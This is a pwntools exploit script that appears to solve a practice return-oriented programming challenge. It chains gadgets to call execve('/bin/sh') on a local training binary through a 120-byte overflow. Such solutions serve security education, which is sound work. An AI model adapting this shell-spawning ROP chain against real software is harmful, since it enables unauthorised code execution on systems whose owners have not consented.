#!/usr/bin/python3
from pwn import *
context.clear(arch='amd64')
context.binary = 'babyrop_level4_teaching1'
r = ROP(context.binary)
e = ELF('./babyrop_level4_teaching1')
p = process('./babyrop_level4_teaching1')
p.recvuntil(b'at: ')
getGadget = lambda x: p64(r.find_gadget(x).address)
stackaddr = int(p.recv(14), 16)
# gdb.attach(p, 'b main')
chain = getGadget(['pop rax', 'ret'])
chain += p64(0x3b)
chain += getGadget(['pop r10', 'ret'])
chain += b'/bin/sh\x00'
chain += getGadget(['pop rdi', 'ret'])
chain += p64(stackaddr+120+24)
chain += getGadget(['pop rsi', 'ret'])
chain += p64(0x0)
chain += getGadget(['pop rdx', 'ret'])
chain += p64(0x0)
chain += getGadget(['syscall'])
# send the ROP chain
p.sendline(fit({120:chain}))
p.interactive()